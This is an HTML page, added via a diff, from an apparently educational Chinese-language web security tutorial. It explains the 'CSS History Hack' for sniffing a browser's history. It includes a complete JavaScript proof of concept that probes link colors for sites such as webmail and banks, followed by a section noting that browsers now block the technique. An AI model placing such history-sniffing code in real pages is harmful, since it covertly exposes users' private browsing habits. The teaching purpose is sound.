@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+       <title>CSS History Hack - Web Security - Web Security</title>
+
+        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome-4.0.3.css" rel="stylesheet">
+        <link rel="stylesheet" href="../../../css/highlight.css">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link href="../../../css/extra.css" rel="stylesheet">
+
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+        <![endif]-->
+
+        
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+
+        <!-- Collapsed navigation -->
+        <div class="navbar-header">
+            <!-- Expander button -->
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+
+            <!-- Main title -->
+            <a class="navbar-brand" href="../../..">Web Security</a>
+        </div>
+
+        <!-- Expanded navigation -->
+        <div class="navbar-collapse collapse">
+            <!-- Main navigation -->
+            <ul class="nav navbar-nav">
+            
+            
+                <li class="dropdown active">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">XSS <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../Overview">XSS</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../XSS-Cookie">Stealing Cookie With XSS</a>
+                        </li>
+                    
+                        <li class="active">
+                            <a href=".">CSS History Hack</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../XSS-Worm">XSS Worm</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../XSS-Defense">XSS Defense</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Browser Security <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Browser_Security/Same-Origin-Policy">Same Origin Policy</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Browser_Security/Browser-Sandbox">Browser Sandbox</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Browser_Security/Malicious-URL-interception">Malicious URL interception</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Web服务配置安全 <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Web_Server_Sercurity/Web-Server-Sercurity">Web Server Sercurity</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">SQL_injection <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../SQL_injection/Overview">Overview</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../SQL_injection/SQL_injection">SQL_injection</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../SQL_injection/SQL_injection_defence">SQL_injection defence</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Clickjacking <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Clickjacking/Overview">Overview</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Clickjacking/Click_Jacking">Click_Jacking</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Clickjacking/Click_Jacking_defence">Click Jacking defence</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">CSRF <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../CSRF/Overview">CSRF</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../CSRF/CSRF_Attack">CSRF Attack</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../CSRF/CSRF_Defense">CSRF Defense</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Web框架安全 <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Web_framework/Overview">Web框架安全概述</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Web_framework/XSS">模板引擎与XSS防御</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Web_framework/csrf">Web框架与CSRF防御</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">拒绝服务攻击 <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../DOS/Overviewed">DOS攻击原理</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../DOS/general-dos">通用的DoS攻击技术</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Access_Control <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Access_Control/Overview">Access_Control</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/DAC">DAC</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/MAC">MAC</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/RBAC">RBAC</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/Perform">Perform</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            </ul>
+
+            <!-- Search, Navigation and Repo links -->
+            <!--
+            <ul class="nav navbar-nav navbar-right">
+                <li >
+                    <a rel="next" href="../XSS-Cookie">
+                        <i class="fa fa-arrow-left"></i> Previous
+                    </a>
+                </li>
+                <li >
+                    <a rel="prev" href="../XSS-Worm">
+                        Next <i class="fa fa-arrow-right"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://github.com/acgotaku/WebSecurity">
+                        
+                            <i class="fa fa-github"></i>
+                        
+                        GitHub
+                    </a>
+                </li>
+                
+            </ul>
+            -->
+        </div>
+    </div>
+</div>
+
+        <div class="container">
+            <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+    
+        <li class="main active"><a href="#css-history-hack">CSS History Hack</a></li>
+        
+            <li><a href="#css-history-hack_1">CSS History Hack 介绍</a></li>
+        
+            <li><a href="#link-style">Link Style</a></li>
+        
+            <li><a href="#_1">如何获取历史记录</a></li>
+        
+            <li><a href="#_2">防范攻击</a></li>
+        
+            <li><a href="#_3">参考</a></li>
+        
+    
+    </ul>
+</div></div>
+            <div class="col-md-9" role="main"><h1 id="css-history-hack">CSS History Hack</h1>
+<p>利用XSS窃取客户隐私</p>
+<hr />
+<h2 id="css-history-hack_1">CSS History Hack 介绍</h2>
+<p>运用一些JavaScript/CSS技巧，黑客能获取用户浏览器的某些历史记录，甚至是在搜索引擎输入的查询字符。该技术最初由<a href="http://jeremiahgrossman.blogspot.jp/2006/08/i-know-where-youve-been.html">Jeremiah Grossman</a>提出，其原理只是利用了
+CSS能定义和控制链接样式的特性。</p>
+<h2 id="link-style">Link Style</h2>
+<p>CSS中有四个伪类用来定义链接的样式，分别是：a:link、a:visited、a:active和 a:hover，他们分别表示未访问的、已访问的、激活的和光标悬停
+在其上的链接，如下所示：</p>
+<pre><code>    a:link {color: #FF0000} 
+    a:visited {color: #00FF00}
+    a:hover {color: #FF00FF}
+    a:active {color: #0000FF}
+</code></pre>
+<p>效果如下图：</p>
+<p><img alt="CSS Link Style" src="../../../img/CSS-1.png" /></p>
+<p>其中青色的是访问过的网站，红色是未访问过的网站。一般来说，用户每天都会浏览很多网页，这些网页都会被浏览器记录下来，除非用户自己刻意清除，否则历史记录降一直
+保存在本地计算机中。倘若攻击者能获取用户浏览器的历史记录或搜索信息，将是一件十分危险的事，攻击者可以在此基础上进一步发起其他攻击，如社会工程学。</p>
+<h2 id="_1">如何获取历史记录</h2>
+<p>黑客是怎样获取到用户的历史记录呢？这需要用到客户端JavaScript和CSS技术，两种技术结合在一起运用就可以知道某人是否访问过一个任意的URL，这种方式叫做“JavaScript/CSS history hack”。该技术主要利用了<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model">Dom</a>中的<a href="https://developer.mozilla.org/en/docs/Web/API/window.getComputedStyle">getComputedStyle()</a>方法来实现。</p>
+<p>其原理就是利用CSS能定义访问过的和未访问过的超级链接的样式。由于JavaScript可以读取任何元素的CSS信息，自然能分辨浏览器应用了哪种样式和用户是否访问过该链接。</p>
+<pre><code>    &lt;H3&gt;Visited&lt;/H3&gt;
+    &lt;ul id="visited"&gt;&lt;/ul&gt;
+
+    &lt;H3&gt;Not Visited&lt;/H3&gt;
+    &lt;ul id="notvisited"&gt;&lt;/ul&gt;
+    &lt;script type="text/javascript"&gt;
+    var websites = [
+        "http://ha.ckers.org/blog/",
+        "http://login.yahoo.com/",
+        "http://mail.google.com/",
+        "http://mail.yahoo.com/",
+        "http://my.yahoo.com/",
+        "http://sla.ckers.org/forum/",
+        "http://slashdot.org/",
+        "http://www.amazon.com/",
+        "http://www.aol.com/",
+        "http://www.apple.com/",
+        "http://www.bankofamerica.com/",
+        "http://www.bankone.com/"
+    ];
+
+    /* Loop through each URL */
+    for (var i = 0; i &lt; websites.length; i++) {
+
+        /* create the new anchor tag with the appropriate URL information */
+        var link = document.createElement("a");
+        link.id = "id" + i;
+        link.href = websites[i];
+        link.innerHTML = websites[i];
+
+        /* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
+        document.write('&lt;style&gt;');
+        document.write('#id' + i + ":visited {color: #FF0000;}");
+        document.write('&lt;/style&gt;');
+
+        /* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
+        document.body.appendChild(link);
+        var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
+        document.body.removeChild(link);
+
+        /* check to see if the link has been visited if the computed color is red */
+        if (color == "rgb(255, 0, 0)") { // visited
+
+            /* add the link to the visited list */
+            var item = document.createElement('li');
+            item.appendChild(link);
+            document.getElementById('visited').appendChild(item);
+
+        } else { // not visited
+
+            /* add the link to the not visited list */
+            var item = document.createElement('li');
+            item.appendChild(link);
+            document.getElementById('notvisited').appendChild(item);
+
+        } // end visited color check if
+
+    } // end URL loop
+    &lt;/script&gt;
+</code></pre>
+<p>运行结果如下图：</p>
+<p><img alt="CSS hack" src="../../../img/CSS-2.png" /></p>
+<p>可以看到通过颜色区分了是否访问过，并且使用JavaScript进行罗列结果。Visited部分罗列的是曾经访问过的网站，Not Visited则是没有访问过的网站列表。</p>
+<h2 id="_2">防范攻击</h2>
+<p>CSS History Hack的防范属于浏览器安全的范畴，目前各大主流浏览器都已经通过限制getComputedStyle这个API封住了这个漏洞。</p>
+<p>如下图所示：</p>
+<p><img alt="CSS hack" src="../../../img/CSS-3.png" /></p>
+<p>尽管CSS可以区分网站是否访问，但是JavaScript却无法获取到正常的返回值。无论是否访问过的URL，返回的color都是未访问的。</p>
+<h2 id="_3">参考</h2>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector">Privacy and the :visited selector</a></p>
+<p><a href="http://ha.ckers.org/weird/CSS-history-hack.html">CSS History Hack</a></p>
+</div>
+        </div>
+        <footer class="footer col-md-12">
+            <hr>
+            
+                <p>Copyright &copy; 2015, <a href="https://github.com/acgotaku/WebSecurity">CSS WebSecurity</a>.</p>
+            
+        </footer>
+
+        <script src="../../../js/jquery-1.10.2.min.js"></script>
+        <script src="../../../js/bootstrap-3.0.3.min.js"></script>
+        <script src="../../../js/highlight.pack.js"></script>
+        <script src="../../../js/base.js"></script>
+    </body>
+</html>
